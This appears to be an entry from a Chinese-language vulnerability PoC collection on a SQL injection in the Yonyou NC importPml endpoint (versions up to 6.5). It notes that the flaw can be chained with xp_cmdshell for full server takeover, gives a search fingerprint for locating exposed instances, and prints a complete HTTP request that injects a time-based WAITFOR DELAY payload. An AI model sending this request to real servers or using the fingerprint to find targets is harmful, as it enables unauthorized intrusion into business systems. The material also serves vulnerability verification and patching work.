﻿# 用友NC importPml SQL注入漏洞

> 更新时间：2024-04-13

> 漏洞编号：

> 漏洞说明：用友NC importPml接口存在SQL注入漏洞，攻击者通过利用SQL注入漏洞配合数据库xp_cmdshell可以执行任意命令，从而控制服务器。经过分析与研判，该漏洞利用难度低，建议尽快修复。

影响版本：用友网络科技股份有限公司-NC version<=6.5

> 漏洞特征：icon_hash="1085941792" && body="/logo/images/logo.gif"

> 验证脚本：HTTP

```
POST /portal/pt/portalpage/importPml?pageId=login&billitem=1'WAITFOR+DELAY+'0:0:5'-- HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryH970hbttBhoCyj9V
Connection: close

------WebKitFormBoundaryH970hbttBhoCyj9V
Content-Disposition: form-data; name="Filedata"; filename="1.jpg"
Content-Type: image/jpeg
------WebKitFormBoundaryH970hbttBhoCyj9V--
```

> 响应代码特征：200

> 响应内容特征：

> 上传文件定位：

> 验证文件来源：用友NC importPml SQL注入漏洞.poc

